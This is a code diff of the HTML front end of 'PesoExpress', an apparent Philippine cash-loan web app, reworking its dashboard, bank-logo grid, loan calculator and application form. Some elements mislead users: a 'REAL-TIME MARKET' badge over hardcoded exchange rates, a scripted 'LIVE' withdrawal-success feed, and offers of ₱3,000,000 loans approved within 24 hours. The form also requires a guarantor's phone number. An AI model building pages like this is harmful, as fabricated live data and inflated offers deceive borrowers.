@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PesoExpress 🇵🇭</title>
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='48' fill='%2300b359'/><circle cx='50' cy='50' r='38' fill='%23ffcc00'/><text x='50' y='67' font-size='50' font-weight='900' text-anchor='middle' fill='%23004c99'>₱</text></svg>">
-    <link rel="stylesheet" href="style.css?v=2.0">
+    <link rel="stylesheet" href="style.css?v=11.0">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
 <body>
@@ -20,7 +20,7 @@
             </div>
             <div class="header-actions">
                 <div class="icon-circle-btn" onclick="openNotificationsModal()" style="cursor: pointer;">
-                    🔔
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path><path d="M13.73 21a2 2 0 0 1-3.46 0"></path></svg>
                     <div class="notification-dot"></div>
                 </div>
                 <div class="user-avatar-badge" id="headerAvatarBadge" onclick="switchMobileTab('profile')" style="cursor: pointer;">2</div>
@@ -32,7 +32,7 @@
             <!-- AUTH SECTION (REGISTER & LOGIN) -->
             <section id="authSection" class="auth-wrapper">
                 <div class="auth-header">
-                    <h2>Fast Peso Cash Loan 🇵🇭</h2>
+                    <h2>Fast Peso Cash Loan</h2>
                     <p>Log in or register to access instant loans up to ₱3,000,000.</p>
                 </div>
 
@@ -87,42 +87,14 @@
                 <!-- TAB 1: HOME DASHBOARD VIEW (MATCHING REFERENCE UI) -->
                 <div id="viewHome">
 
-                    <!-- HERO CAROUSEL BANNER CARD -->
-                    <div class="hero-banner-card" id="heroBannerCard">
-                        <div class="banner-top-badge" id="bannerBadge">
-                            📢 Big Loans for Business
-                        </div>
-                        <div class="banner-content">
-                            <span style="font-size: 0.85rem; opacity: 0.9;" id="bannerSub">every need,</span>
-                            <h3 style="color: #ff3333;" id="bannerTitle">VERY DREAM.</h3>
-                            <p style="font-size: 0.75rem; opacity: 0.8; margin-top: 0.2rem;" id="bannerTags">PERSONAL LOAN | HOME LOAN</p>
-                            <h4 style="font-size: 1.1rem; margin-top: 0.4rem; color: #ffeb3b;" id="bannerFooter">Big Loans for Business</h4>
-                        </div>
-                        <div class="banner-dots">
-                            <div class="banner-dot active" onclick="setSlide(0)"></div>
-                            <div class="banner-dot" onclick="setSlide(1)"></div>
-                            <div class="banner-dot" onclick="setSlide(2)"></div>
-                            <div class="banner-dot" onclick="setSlide(3)"></div>
-                        </div>
-                    </div>
-
-                    <!-- "APPLY NOW" BLUE QUICK ACTION BOX -->
-                    <div class="apply-action-card">
-                        <div class="apply-action-header">
-                            <div class="apply-icon-box" style="font-size: 1.6rem;">💰</div>
-                            <div class="apply-action-text">
-                                <h4>Apply Now</h4>
-                                <p>Fast application, simple process, quick approval.</p>
+                    <!-- 1. EXCHANGE RATES CARD (TOP) -->
+                    <div class="exchange-rates-card">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.85rem;">
+                            <h4 style="font-size: 1.1rem; font-weight: 800; margin: 0;">Exchange Rates</h4>
+                            <div style="display: flex; align-items: center; gap: 0.4rem; font-size: 0.72rem; font-weight: 700; color: #059669; background: #ecfdf5; padding: 0.25rem 0.6rem; border-radius: 12px; border: 1px solid #a7f3d0;">
+                                <div style="width: 6px; height: 6px; border-radius: 50%; background: #10b981; animation: pulse 1.5s infinite;"></div> REAL-TIME MARKET
                             </div>
                         </div>
-                        <button class="btn-apply-pill" onclick="switchMobileTab('apply')">
-                            Apply Now <span style="font-weight: 900;">&rsaquo;</span>
-                        </button>
-                    </div>
-
-                    <!-- EXCHANGE RATES CARD -->
-                    <div class="exchange-rates-card">
-                        <h4>Exchange Rates</h4>
                         <table class="rates-table">
                             <thead>
                                 <tr>
@@ -139,8 +111,8 @@
                                             <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="15" fill="#b22234"/><path d="M0 2.3h22M0 4.6h22M0 6.9h22M0 9.2h22M0 11.5h22M0 13.8h22" stroke="#fff" stroke-width="1.15"/><rect width="10" height="8" fill="#3c3b6e"/></svg> USD</span>
                                         </div>
                                     </td>
-                                    <td class="center"><span class="rate-badge">0.017</span></td>
-                                    <td class="center"><span class="rate-badge">0.017</span></td>
+                                    <td class="center"><span class="rate-badge" id="rateBuyUSD">0.017</span></td>
+                                    <td class="center"><span class="rate-badge" id="rateSellUSD" style="background:#059669;">0.017</span></td>
                                 </tr>
                                 <tr>
                                     <td>
@@ -149,8 +121,8 @@
                                             <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="15" fill="#003399"/><circle cx="11" cy="7.5" r="4.5" fill="none" stroke="#ffcc00" stroke-dasharray="1 1.3" stroke-width="1.5"/></svg> EUR</span>
                                         </div>
                                     </td>
-                                    <td class="center"><span class="rate-badge">0.015</span></td>
-                                    <td class="center"><span class="rate-badge">0.015</span></td>
+                                    <td class="center"><span class="rate-badge" id="rateBuyEUR">0.015</span></td>
+                                    <td class="center"><span class="rate-badge" id="rateSellEUR" style="background:#059669;">0.015</span></td>
                                 </tr>
                                 <tr>
                                     <td>
@@ -159,8 +131,8 @@
                                             <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="7.5" fill="#ce1126"/><rect y="7.5" width="22" height="7.5" fill="#ffffff"/></svg> IDR</span>
                                         </div>
                                     </td>
-                                    <td class="center"><span class="rate-badge">291.769</span></td>
-                                    <td class="center"><span class="rate-badge">291.769</span></td>
+                                    <td class="center"><span class="rate-badge" id="rateBuyIDR">291.769</span></td>
+                                    <td class="center"><span class="rate-badge" id="rateSellIDR" style="background:#059669;">291.769</span></td>
                                 </tr>
                                 <tr>
                                     <td>
@@ -169,8 +141,8 @@
                                             <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="15" fill="#cc0000"/><path d="M0 2.1h22M0 4.2h22M0 6.3h22M0 8.4h22M0 10.5h22M0 12.6h22" stroke="#fff" stroke-width="1.05"/><rect width="11" height="8.4" fill="#000066"/><circle cx="5" cy="4.2" r="2.5" fill="#ffcc00"/></svg> MYR</span>
                                         </div>
                                     </td>
-                                    <td class="center"><span class="rate-badge">0.067</span></td>
-                                    <td class="center"><span class="rate-badge">0.067</span></td>
+                                    <td class="center"><span class="rate-badge" id="rateBuyMYR">0.067</span></td>
+                                    <td class="center"><span class="rate-badge" id="rateSellMYR" style="background:#059669;">0.067</span></td>
                                 </tr>
                                 <tr>
                                     <td>
@@ -179,17 +151,92 @@
                                             <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="15" fill="#ee1c25"/><polygon points="3,2 4,5 1,3 5,3 2,5" fill="#ffde00"/></svg> CNY</span>
                                         </div>
                                     </td>
-                                    <td class="center"><span class="rate-badge">0.111</span></td>
-                                    <td class="center"><span class="rate-badge">0.111</span></td>
+                                    <td class="center"><span class="rate-badge" id="rateBuyCNY">0.111</span></td>
+                                    <td class="center"><span class="rate-badge" id="rateSellCNY" style="background:#059669;">0.111</span></td>
                                 </tr>
                             </tbody>
                         </table>
                     </div>
 
+                    <!-- 2. HERO PROMO BANNER (MIDDLE) -->
+                    <div class="hero-banner-card" id="heroBannerCard" style="margin-bottom: 1.25rem;">
+                        <div class="banner-top-badge" id="bannerBadge">
+                            Big Loans for Business
+                        </div>
+                        <div class="banner-content">
+                            <span style="font-size: 0.85rem; opacity: 0.9;" id="bannerSub">every need,</span>
+                            <h3 style="color: #ff3333;" id="bannerTitle">VERY DREAM.</h3>
+                            <p style="font-size: 0.75rem; opacity: 0.8; margin-top: 0.2rem;" id="bannerTags">PERSONAL LOAN | HOME LOAN</p>
+                            <h4 style="font-size: 1.1rem; margin-top: 0.4rem; color: #ffeb3b;" id="bannerFooter">Big Loans for Business</h4>
+                        </div>
+                        <div class="banner-dots">
+                            <div class="banner-dot active" onclick="setSlide(0)"></div>
+                            <div class="banner-dot" onclick="setSlide(1)"></div>
+                            <div class="banner-dot" onclick="setSlide(2)"></div>
+                            <div class="banner-dot" onclick="setSlide(3)"></div>
+                        </div>
+                    </div>
+
+                    <!-- APPLY NOW PROMO CARD (CLEAN EMOJI-FREE SVG ICON) -->
+                    <div style="background: #0066cc; border-radius: 16px; padding: 1.25rem; margin-bottom: 1.25rem; color: white; box-shadow: 0 4px 14px rgba(0,102,204,0.3);">
+                        <div style="display: flex; align-items: center; gap: 0.85rem; margin-bottom: 1rem;">
+                            <div style="width: 44px; height: 44px; border-radius: 12px; background: rgba(255,255,255,0.2); display: flex; align-items: center; justify-content: center;">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg>
+                            </div>
+                            <div>
+                                <h3 style="margin: 0; font-size: 1.3rem; font-weight: 800; color: white;">Apply Now</h3>
+                                <p style="margin: 0.1rem 0 0 0; font-size: 0.82rem; opacity: 0.9;">Fast application, simple process, quick approval.</p>
+                            </div>
+                        </div>
+                        <button onclick="switchMobileTab('apply')" style="width: 100%; padding: 0.85rem; border-radius: 25px; background: white; color: #059669; border: none; font-weight: 800; font-size: 1.05rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.4rem; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+                            Apply Now <span style="font-size: 1.2rem;">&rsaquo;</span>
+                        </button>
+                    </div>
+
+                    <!-- 3. SERVICES CARD (BOTTOM - MATCHING SCREENSHOT EXACTLY) -->
+                    <div class="application-card" style="margin-bottom: 1.25rem;">
+                        <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 1.25rem;">
+                            <div>
+                                <h3 style="font-size: 1.3rem; font-weight: 800; color: var(--text-dark); margin-bottom: 0.2rem;">Services</h3>
+                                <p style="font-size: 0.82rem; color: var(--text-muted);">Manage your loan and account options</p>
+                            </div>
+                            <div style="width: 42px; height: 42px; border-radius: 10px; background: #d1fae5; display: flex; align-items: center; justify-content: center;">
+                                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg>
+                            </div>
+                        </div>
+
+                        <!-- OPTION 1: APPLY NOW AND SIMPLE LOAN PROCESS -->
+                        <div onclick="switchMobileTab('apply')" style="border: 1px solid #d1fae5; border-radius: 14px; padding: 1rem 1.2rem; margin-bottom: 0.85rem; display: flex; align-items: center; justify-content: space-between; cursor: pointer; background: #fff; box-shadow: 0 2px 8px rgba(0,0,0,0.03); transition: transform 0.2s;">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                            <div style="text-align: center; font-weight: 800; color: #10b981; font-size: 1rem; line-height: 1.35; padding: 0 0.5rem; flex: 1;">
+                                Apply now and simple loan process
+                            </div>
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#0ea5e9" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 22h14"></path><path d="M5 2h14"></path><path d="M17 22v-4.172a2 2 0 0 0-.586-1.414L12 12l-4.414 4.414A2 2 0 0 0 7 17.828V22"></path><path d="M7 2v4.172a2 2 0 0 0 .586 1.414L12 12l4.414-4.414A2 2 0 0 0 17 6.172V2"></path></svg>
+                        </div>
+
+                        <!-- OPTION 2: LOAN LIMIT UP TO 3 MILLION PESO -->
+                        <div onclick="switchMobileTab('apply')" style="border: 1px solid #d1fae5; border-radius: 14px; padding: 1rem 1.2rem; margin-bottom: 0.85rem; display: flex; align-items: center; justify-content: space-between; cursor: pointer; background: #fff; box-shadow: 0 2px 8px rgba(0,0,0,0.03); transition: transform 0.2s;">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                            <div style="text-align: center; font-weight: 800; color: #10b981; font-size: 1rem; line-height: 1.35; padding: 0 0.5rem; flex: 1;">
+                                Loan limit up to 3 million peso
+                            </div>
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#0ea5e9" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10H12V2z"></path><path d="M12 12L2.5 7.5"></path><path d="M12 12V22"></path></svg>
+                        </div>
+
+                        <!-- OPTION 3: NORMALLY APPROVED IN 24H -->
+                        <div onclick="switchMobileTab('apply')" style="border: 1px solid #d1fae5; border-radius: 14px; padding: 1rem 1.2rem; display: flex; align-items: center; justify-content: space-between; cursor: pointer; background: #fff; box-shadow: 0 2px 8px rgba(0,0,0,0.03); transition: transform 0.2s;">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                            <div style="text-align: center; font-weight: 800; color: #10b981; font-size: 0.92rem; line-height: 1.35; padding: 0 0.5rem; flex: 1;">
+                                Normally the application get approve in 24h after making application successfully
+                            </div>
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#0ea5e9" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"></polyline><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path></svg>
+                        </div>
+                    </div>
+
                     <!-- LIVE WITHDRAWAL SUCCESS FEED CARD -->
                     <div class="withdrawal-feed-card">
                         <div class="withdrawal-feed-header">
-                            <h4>🎉 Recent Withdrawal Success</h4>
+                            <h4>Recent Withdrawal Success</h4>
                             <div class="live-pulse-badge">
                                 <div class="pulse-dot"></div> LIVE
                             </div>
@@ -197,13 +244,6 @@
                         <div class="ticker-container" id="withdrawalTickerContainer">
                             <!-- Populated dynamically via JS -->
                         </div>
-                    </div>
-
-                    <!-- SECONDARY PROMO BANNER -->
-                    <div style="background: linear-gradient(135deg, #e0f2fe 0%, #bae6fd 100%); padding: 1.25rem; border-radius: var(--radius-lg); text-align: center; border: 1px solid #7dd3fc;">
-                        <span style="font-size: 0.75rem; color: #0369a1; font-weight: 800; letter-spacing: 1px;">YOUR DREAMS, OUR SUPPORT</span>
-                        <h3 style="color: #0284c7; font-size: 1.3rem; margin-top: 0.2rem;">LOAN MADE EASY</h3>
-                        <p style="font-size: 0.8rem; color: #0369a1; margin-top: 0.3rem;">⚡ Low Interest | 🛡️ Trusted & Secure</p>
                     </div>
 
                 </div>
@@ -241,7 +281,7 @@
                         </div>
 
                         <div class="wallet-buttons-grid">
-                            <button class="btn-wallet-light" onclick="switchMobileTab('apply')">
+                            <button class="btn-wallet-light" onclick="openLoanDetailModal()">
                                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg> Loan Detail
                             </button>
                             <button id="withdrawActionBtn" class="btn-wallet-dark" onclick="processLoanWithdrawal()">
@@ -257,26 +297,86 @@
                             Supported Banks
                         </h4>
                         <div class="banks-grid">
-                            <div class="bank-card-tile bpi-tile">BPI</div>
-                            <div class="bank-card-tile bdo-tile"><div>BDO</div><div class="sub-text">Unibank</div></div>
-                            <div class="bank-card-tile bc-tile">BC</div>
-                            <div class="bank-card-tile cimb-tile"><div>CIMB BANK</div><div class="sub-text">PHILIPPINES</div></div>
-                            <div class="bank-card-tile gcash-tile">GCash</div>
-                            <div class="bank-card-tile metro-tile">METRO</div>
-                            <div class="bank-card-tile pnb-tile">PNB</div>
-                            <div class="bank-card-tile landbank-tile"><div>LANDBANK</div><div class="sub-text">Pay</div></div>
-                            <div class="bank-card-tile security-tile"><div>SECURITY</div><div class="sub-text">BANK</div></div>
-                            <div class="bank-card-tile union-tile"><div>UB</div><div class="sub-text">UnionBank</div></div>
-                            <div class="bank-card-tile rbank-tile"><div>R</div><div class="sub-text">BANK</div></div>
-                            <div class="bank-card-tile maya-tile">maya</div>
-                            <div class="bank-card-tile psbank-tile">PSBank</div>
-                            <div class="bank-card-tile dbp-tile">DBP</div>
-                            <div class="bank-card-tile maribank-tile">MariBank</div>
-                            <div class="bank-card-tile gotyme-tile"><div>GOtyme</div><div class="sub-text">bank</div></div>
-                            <div class="bank-card-tile shopeepay-tile"><div>S</div><div class="sub-text">Pay</div></div>
-                            <div class="bank-card-tile grabpay-tile"><div>GrabPay</div><div class="sub-text">MERCHANT</div></div>
-                            <div class="bank-card-tile aub-tile">AUB</div>
-                            <div class="bank-card-tile ptc-tile">PTC</div>
+                            <div class="bank-card-tile bpi-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=bpi.com.ph&sz=128" alt="BPI" class="bank-logo-img">
+                                <span>BPI</span>
+                            </div>
+                            <div class="bank-card-tile bdo-tile">
+                                <img src="bdo.png" alt="BDO" class="bank-logo-img">
+                                <div>BDO</div>
+                            </div>
+                            <div class="bank-card-tile bc-tile">
+                                <img src="bankcom.png" alt="BankCom" class="bank-logo-img">
+                                <div>BankCom</div>
+                            </div>
+                            <div class="bank-card-tile cimb-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=cimbbank.com.ph&sz=128" alt="CIMB" class="bank-logo-img">
+                                <div>CIMB</div>
+                            </div>
+                            <div class="bank-card-tile gcash-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=gcash.com&sz=128" alt="GCash" class="bank-logo-img">
+                                <div>GCash</div>
+                            </div>
+                            <div class="bank-card-tile metro-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=metrobank.com.ph&sz=128" alt="Metrobank" class="bank-logo-img">
+                                <div>Metro</div>
+                            </div>
+                            <div class="bank-card-tile pnb-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=pnb.com.ph&sz=128" alt="PNB" class="bank-logo-img">
+                                <div>PNB</div>
+                            </div>
+                            <div class="bank-card-tile landbank-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=landbank.com&sz=128" alt="Landbank" class="bank-logo-img">
+                                <div>LANDBANK</div>
+                            </div>
+                            <div class="bank-card-tile security-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=securitybank.com&sz=128" alt="Security Bank" class="bank-logo-img">
+                                <div>Security</div>
+                            </div>
+                            <div class="bank-card-tile union-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=unionbankph.com&sz=128" alt="UnionBank" class="bank-logo-img">
+                                <div>UnionBank</div>
+                            </div>
+                            <div class="bank-card-tile rbank-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=robinsonsbank.com.ph&sz=128" alt="RBank" class="bank-logo-img">
+                                <div>RBank</div>
+                            </div>
+                            <div class="bank-card-tile maya-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=maya.ph&sz=128" alt="Maya" class="bank-logo-img">
+                                <div>Maya</div>
+                            </div>
+                            <div class="bank-card-tile psbank-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=psbank.com.ph&sz=128" alt="PSBank" class="bank-logo-img">
+                                <div>PSBank</div>
+                            </div>
+                            <div class="bank-card-tile dbp-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=dbp.ph&sz=128" alt="DBP" class="bank-logo-img">
+                                <div>DBP</div>
+                            </div>
+                            <div class="bank-card-tile maribank-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=shopee.ph&sz=128" alt="MariBank" class="bank-logo-img">
+                                <div>MariBank</div>
+                            </div>
+                            <div class="bank-card-tile gotyme-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=gotyme.com.ph&sz=128" alt="GOtyme" class="bank-logo-img">
+                                <div>GOtyme</div>
+                            </div>
+                            <div class="bank-card-tile shopeepay-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=shopee.ph&sz=128" alt="ShopeePay" class="bank-logo-img">
+                                <div>ShopeePay</div>
+                            </div>
+                            <div class="bank-card-tile grabpay-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=grab.com&sz=128" alt="GrabPay" class="bank-logo-img">
+                                <div>GrabPay</div>
+                            </div>
+                            <div class="bank-card-tile aub-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=aub.com.ph&sz=128" alt="AUB" class="bank-logo-img">
+                                <div>AUB</div>
+                            </div>
+                            <div class="bank-card-tile ptc-tile">
+                                <img src="https://www.google.com/s2/favicons?domain=pnb.com.ph&sz=128" alt="PTC" class="bank-logo-img">
+                                <div>PTC</div>
+                            </div>
                         </div>
                     </div>
 
@@ -288,34 +388,57 @@
                 <!-- TAB 3: APPLICATION WIZARD VIEW (`#viewApply`) -->
                 <div id="viewApply" style="display: none;">
                     
-                    <!-- CALCULATOR -->
+                    <!-- CALCULATOR (DIRECT NUMBER INPUTS - NO SLIDERS) -->
                     <div style="background: white; border-radius: var(--radius-lg); padding: 1.25rem; margin-bottom: 1.25rem; box-shadow: var(--shadow-md);">
-                        <h4 style="margin-bottom: 1rem; color: var(--primary-blue);">Loan Estimator</h4>
-                        <div class="slider-container" style="margin-bottom: 1rem;">
-                            <div style="display: flex; justify-content: space-between; font-size: 0.85rem; font-weight: 700;">
-                                <span>Desired Amount</span>
-                                <span style="color: var(--primary-blue);" id="calcAmountDisplay">₱ 500,000</span>
+                        <h4 style="margin-bottom: 1.25rem; color: var(--primary-blue); font-weight: 800; display: flex; align-items: center; justify-content: space-between;">
+                            <span>Loan Estimator</span>
+                            <span style="font-size: 0.75rem; background: #e0f2fe; color: #0369a1; padding: 0.2rem 0.6rem; border-radius: 12px; font-weight: 700;">Direct Input</span>
+                        </h4>
+                        
+                        <!-- Desired Amount with Direct Number Input -->
+                        <div style="margin-bottom: 1.25rem;">
+                            <label style="display: block; font-size: 0.85rem; font-weight: 700; color: var(--text-dark); margin-bottom: 0.4rem;">
+                                Desired Loan Amount (PHP)
+                            </label>
+                            <div style="display: flex; align-items: center; background: #f8fafc; border: 2px solid #e2e8f0; border-radius: 12px; padding: 0.6rem 0.85rem;">
+                                <span style="color: var(--primary-blue); font-weight: 900; font-size: 1.2rem; margin-right: 0.5rem;">₱</span>
+                                <input type="number" id="calcAmount" min="80000" max="3000000" step="10000" value="500000" oninput="updateCalculator()" style="width: 100%; border: none; background: transparent; font-size: 1.15rem; font-weight: 800; color: #0f172a; outline: none;" placeholder="Enter amount (80,000 - 3,000,000)">
                             </div>
-                            <input type="range" id="calcAmount" min="10000" max="3000000" step="10000" value="500000" oninput="updateCalculator()">
+                            <div style="display: flex; justify-content: space-between; font-size: 0.75rem; color: var(--text-muted); margin-top: 0.35rem; font-weight: 600;">
+                                <span>Min: ₱ 80,000</span>
+                                <span>Max: ₱ 3,000,000</span>
+                            </div>
                         </div>
 
-                        <div class="slider-container" style="margin-bottom: 1rem;">
-                            <div style="display: flex; justify-content: space-between; font-size: 0.85rem; font-weight: 700;">
-                                <span>Repayment Term</span>
-                                <span id="calcTermDisplay">12 Months (1 Year)</span>
+                        <!-- Repayment Term with Direct Number Input -->
+                        <div style="margin-bottom: 1.25rem;">
+                            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.4rem;">
+                                <label style="font-size: 0.85rem; font-weight: 700; color: var(--text-dark);">
+                                    Repayment Term (Months)
+                                </label>
+                                <span id="calcTermDisplay" style="color: var(--primary-blue); font-weight: 800; font-size: 0.85rem;">12 Months (1 Year)</span>
                             </div>
-                            <input type="range" id="calcTerm" min="1" max="36" step="1" value="12" oninput="updateCalculator()">
+                            <div style="display: flex; align-items: center; background: #f8fafc; border: 2px solid #e2e8f0; border-radius: 12px; padding: 0.6rem 0.85rem;">
+                                <input type="number" id="calcTerm" min="1" max="36" step="1" value="12" oninput="updateCalculator()" style="width: 100%; border: none; background: transparent; font-size: 1.15rem; font-weight: 800; color: #0f172a; outline: none;" placeholder="Enter tenure in months (1 - 36)">
+                                <span style="color: #64748b; font-weight: 700; font-size: 0.9rem; margin-left: 0.5rem; white-space: nowrap;">Months</span>
+                            </div>
                         </div>
 
-                        <div style="background: #f8fafc; padding: 0.85rem; border-radius: var(--radius-sm); display: flex; justify-content: space-between; font-size: 0.85rem;">
-                            <div><span>Est. Monthly</span><br><strong id="calcInterest">₱ 45,833 /mo</strong></div>
-                            <div style="text-align: right;"><span>Total Repay</span><br><strong id="calcTotal" style="color: var(--accent-green);">₱ 550,000</strong></div>
+                        <div style="background: #f8fafc; padding: 0.85rem 1rem; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; font-size: 0.85rem; border: 1px solid #e2e8f0;">
+                            <div>
+                                <span style="font-size: 0.75rem; color: var(--text-muted); display: block; font-weight: 600;">Est. Monthly</span>
+                                <strong id="calcInterest" style="color: var(--text-dark); font-size: 1.1rem; font-weight: 800;">₱ 45,817 /mo</strong>
+                            </div>
+                            <div style="text-align: right;">
+                                <span style="font-size: 0.75rem; color: var(--text-muted); display: block; font-weight: 600;">Total Repay</span>
+                                <strong id="calcTotal" style="color: var(--accent-green); font-size: 1.1rem; font-weight: 800;">₱ 549,800</strong>
+                            </div>
                         </div>
                     </div>
 
                     <!-- 4-STEP FORM WIZARD -->
                     <div class="application-card">
-                        <h3 style="text-align: center; margin-bottom: 1rem;">Loan Application Wizard</h3>
+                        <h3 style="text-align: center; margin-bottom: 1rem; font-weight: 800;">Loan Application Wizard</h3>
                         
                         <div class="step-indicator">
                             <div id="stepHeader1" class="step-item active"><div class="step-number">1</div><div class="step-label">Personal</div></div>
@@ -325,57 +448,124 @@
                         </div>
 
                         <form id="loanForm" onsubmit="submitLoanApplication(event)">
-                            <!-- Step 1 -->
+                            <!-- Step 1: Personal Details -->
                             <div id="step1" class="form-step">
-                                <div class="form-group"><label>Full Legal Name</label><input type="text" id="fullName" class="form-control" placeholder="Juan Dela Cruz" required></div>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem;">
+                                    <div class="form-group"><label>First Name</label><input type="text" id="firstName" class="form-control" placeholder="Juan" required></div>
+                                    <div class="form-group"><label>Last Name</label><input type="text" id="lastName" class="form-control" placeholder="Dela Cruz" required></div>
+                                </div>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem;">
+                                    <div class="form-group"><label>Nickname</label><input type="text" id="nickname" class="form-control" placeholder="Johnny"></div>
+                                    <div class="form-group"><label>Phone Number</label><input type="text" id="applicantPhone" class="form-control" placeholder="09171234567" required></div>
+                                </div>
+                                <div class="form-group"><label>Guarantor Phone Number</label><input type="text" id="guarantorPhone" class="form-control" placeholder="Guarantor mobile number (e.g. 09189876543)" required></div>
                                 <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem;">
                                     <div class="form-group"><label>Gender</label><select id="gender" class="form-control" required><option value="Male">Male</option><option value="Female">Female</option></select></div>
                                     <div class="form-group"><label>Date of Birth</label><input type="date" id="dob" class="form-control" required></div>
                                 </div>
-                                <div class="form-group"><label>Civil Status</label><select id="civilStatus" class="form-control" required><option value="Single">Single</option><option value="Married">Married</option></select></div>
-                                <div class="form-group"><label>Address</label><textarea id="address" class="form-control" rows="2" required></textarea></div>
-                                <button type="button" class="btn btn-primary btn-block" onclick="goToStep(2)">Next &rarr;</button>
+                                <div class="form-group"><label>Civil Status</label><select id="civilStatus" class="form-control" required><option value="Single">Single</option><option value="Married">Married</option><option value="Widowed">Widowed</option></select></div>
+                                <div class="form-group"><label>Address</label><textarea id="address" class="form-control" rows="2" placeholder="Complete residential address" required></textarea></div>
+                                <button type="button" class="btn btn-primary btn-block" style="font-weight:700;" onclick="goToStep(2)">NEXT &rarr;</button>
                             </div>
 
-                            <!-- Step 2 -->
+                            <!-- Step 2: Work & Loan Purpose -->
                             <div id="step2" class="form-step" style="display: none;">
-                                <div class="form-group"><label>Employment Type</label><select id="employmentType" class="form-control" required><option value="Employed (Private)">Employed (Private)</option><option value="Self-Employed">Self-Employed</option></select></div>
-                                <div class="form-group"><label>Monthly Income (PHP)</label><input type="number" id="monthlyIncome" class="form-control" required></div>
-                                <div class="form-group"><label>Loan Purpose</label><select id="loanPurpose" class="form-control" required><option value="Emergency Expenses">Emergency Expenses</option><option value="Business Capital">Business Capital</option></select></div>
-                                <div style="display: flex; gap: 0.75rem;"><button type="button" class="btn btn-secondary" style="flex:1;" onclick="goToStep(1)">&larr; Back</button><button type="button" class="btn btn-primary" style="flex:2;" onclick="goToStep(3)">Next &rarr;</button></div>
+                                <div class="form-group"><label>Employment Type</label><input type="text" id="employmentType" class="form-control" placeholder="Enter your occupation / employment (e.g. Teacher, Engineer)" required></div>
